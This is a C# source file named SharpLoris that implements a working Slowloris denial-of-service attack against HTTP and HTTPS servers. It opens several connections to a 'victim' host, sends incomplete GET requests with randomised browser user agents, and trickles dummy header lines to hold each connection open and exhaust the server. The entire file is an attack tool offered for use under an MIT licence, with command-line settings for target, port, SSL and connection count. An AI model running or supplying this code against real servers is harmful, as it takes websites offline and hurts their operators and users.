/* SharpLoris - C# Slowloris Attack HTTP(S) Attack Implementation
 * 
 * Copyright(c) 2017 nikitpad
 * 
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 * 
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
*/
using System;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Net.Security;
using System.Net;
using System.Threading;
using SharpLoris.Properties;

namespace SharpLoris
{
    class Program
    {
        static string HostOrIP = ""; // Victim's IP or hostname
        static int Port = 80; // Victim's port
        static bool UseSsl = false; // Will we use SSL when attacking?
        static int Delay = 15000; // Delay between keep alive data
        static int SockCount = 8; // How many connections to make?
        static Random Rand = new Random(); // Random number generator
        static string[] UserAgents = // User agent list
        {
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
            "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
            "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0"
        };
        static void Main(string[] args)
        {
            if (args.Length <= 0) // If there are no arguments,
            {
                Console.WriteLine(Resources.Usage); // Write the default usage string.
                Console.Write("Press any key to continue . . .");
                Console.ReadKey(false);
            }
            else
            {
                foreach (string arg in args) // Parse each argument
                {
                    try
                    {
                        switch (arg.Split('=')[0]) // Argument parsing
                        {
                            case "ssl": // Use SSL?
                                UseSsl = arg.Split('=')[1] == "true";
                                if (Port == 80)
                                    Port = 443; // Automatically set the default port to 443
                                break;
                            case "port":
                                Port = int.Parse(arg.Split('=')[1]);
                                break;
                            case "host": // Set hostname
                                HostOrIP = arg.Split('=')[1];
                                break;
                            case "sockcount":
                                SockCount = int.Parse(arg.Split('=')[1]); // Set number of connections
                                break;
                            case "delay": // Set delay between keep alive data
                                Delay = int.Parse(arg.Split('=')[1]);
                                break;
                        }
                    }
                    catch (Exception e) { Console.WriteLine($"Argument {arg} parse error! Continuing..."); }
                }
                Console.WriteLine("Initiating sockets.");
                for (int i = 0; SockCount > i; i++) // Create sockets for attack
                    try { InitClient(new TcpClient()); } catch { }
            }      
        }
        static void InitClient(TcpClient c)
        {
            byte[] GET = Encoding.UTF8.GetBytes($"GET /?{Rand.Next(2000)} HTTP/1.1\r\n"); // GET request to random nonexistent location
            byte[] UserAgent = Encoding.UTF8.GetBytes($"User-Agent: {UserAgents[Rand.Next(UserAgents.Length)]}"); // Random user agent
            byte[] AcceptLanguage = Encoding.UTF8.GetBytes("Accept-Language: en-US,en,q=0.5"); 
            try
            {
                c.Connect(Dns.GetHostEntry(HostOrIP).AddressList.Where(x => x.AddressFamily == AddressFamily.InterNetwork).First(), Port); // Resolve hostname and connect
                if (UseSsl)
                {
                    SocketSafe(c, () =>
                    {
                        Console.WriteLine($"Initiating socket ({c.Client.LocalEndPoint})");
                        SslStream s = new SslStream(c.GetStream()); // Create SSL
                        Console.WriteLine($"Authenticating with SSL ({c.Client.LocalEndPoint})");
                        s.AuthenticateAsClient(HostOrIP); // Authenticate
                        s.Write(GET, 0, GET.Length);
                        s.Write(UserAgent, 0, UserAgent.Length);
                        s.Write(AcceptLanguage, 0, AcceptLanguage.Length);
                        new Thread(x =>
                        {
                            SocketSafe(c, () =>
                            {
                                while (true)
                                {
                                    Console.WriteLine($"Sending keep alive data... ({c.Client.LocalEndPoint})");
                                    byte[] XA = Encoding.UTF8.GetBytes($"X-a: {Rand.Next(5000)}"); 
                                    s.Write(XA, 0, XA.Length); // Send keep alive data to keep the connection open
                                    Thread.Sleep(Delay); // Wait
                                }
                            });
                        }).Start();
                    });
                }
                else
                {
                    SocketSafe(c, () =>
                    {

                        Console.WriteLine($"Initiating socket ({c.Client.LocalEndPoint})");
                        NetworkStream s = c.GetStream();
                        s.Write(GET, 0, GET.Length);
                        s.Write(UserAgent, 0, UserAgent.Length);
                        s.Write(AcceptLanguage, 0, AcceptLanguage.Length);
                        new Thread(x =>
                        {
                            SocketSafe(c, () =>
                            {
                                while (true)
                                {
                                    Console.WriteLine($"Sending keep alive data... ({c.Client.LocalEndPoint})");
                                    byte[] XA = Encoding.UTF8.GetBytes($"X-a: {Rand.Next(5000)}");
                                    s.Write(XA, 0, XA.Length); // Send keep alive data to keep the connection open
                                    Thread.Sleep(Delay); // Wait
                                }
                            });
                        }).Start();
                    });
                }
            } catch(Exception e) { Console.WriteLine($"Error connecting:\r\n{e}"); }
        }
        static void SocketSafe(TcpClient c, Action a)
        {
            try
            {
                a();
            }
            catch (Exception e)
            {
                Console.WriteLine($"Something went wrong, recreating socket:\r\n{e}");
                InitClient(c);
            }
        }
    }
}
